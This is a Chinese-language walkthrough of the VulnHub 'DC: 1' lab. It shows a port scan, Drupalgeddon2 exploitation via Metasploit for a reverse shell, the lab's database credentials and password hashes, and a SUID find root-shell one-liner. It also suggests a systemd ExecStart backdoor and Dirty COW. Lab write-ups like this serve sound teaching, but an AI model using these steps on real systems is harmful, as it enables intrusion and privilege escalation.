# DC: 1

2024-5-27 https://www.vulnhub.com/entry/dc-1,292/

difficulty: Beginner

## IP

192.168.5.30

## Scan

Open Port -> 22,80,111,48016

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4d659e6774c227a961660678b42488f (DSA)
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41704/udp6  status
|   100024  1          48016/tcp   status
|   100024  1          48779/tcp6  status
|_  100024  1          49272/udp   status
48016/tcp open  status  1 (RPC #100024)
```

访问 80 web 服务，首页显示一个 Drupal CMS，先用 gobuster 进行目录扫描，看看有没有隐藏目录：

```
http://192.168.5.30/robots.txt
```

经过查询，这个 cms 存在漏洞，msf 中有集成的利用 exp：

```
unix/webapp/drupal_drupalgeddon2
```

设置好 RHOSTS 和 LHOST 后，run，就可以得到反弹的 meterpreter。

得到了第一个 flag1：

```
meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.
```

提示我们寻找 cms 的配置文件，里面应该有数据库的密码，对应可能就是 ssh 用户的密码，或者是数据库中存储了相关的密码凭据。

发现数据库配置信息 /var/www/sites/default/settings.php ：

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

尝试 su flag4 不成功，只好进入数据库看看有没有用户信息：

```
use drupaldb;
select * from users;

admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
```

尝试破解这两个哈希，找到明文。

得到 flag4：

```
www-data@DC-1:/home/flag4$ cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

提权到 root，suid 发现特殊程序 /usr/bin/find,直接进行利用：

```
find . -exec /bin/bash -p \; -quit

cd /root

bash-4.2# cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

提权到 root：

```
www-data@DC-1:/etc/systemd/system$ ls -al syslog.service
lrwxrwxrwx 1 root root 35 Oct  8  2014 syslog.service -> /lib/systemd/system/rsyslog.service
www-data@DC-1:/etc/systemd/system$ cat syslog.service
[Unit]
Description=System Logging Service

[Service]
ExecStart=/usr/sbin/rsyslogd -n -c5
Sockets=syslog.socket
StandardOutput=null

[Install]
WantedBy=multi-user.target
Alias=syslog.service
```

这个 service 对 www-data 用户可写，可以将后门代码，写入到 ExecStart 替换原有的命令，然后服务器重启，便可以提权到 root。

内核版本较老，可以用 dirtycow 进行内核提权。
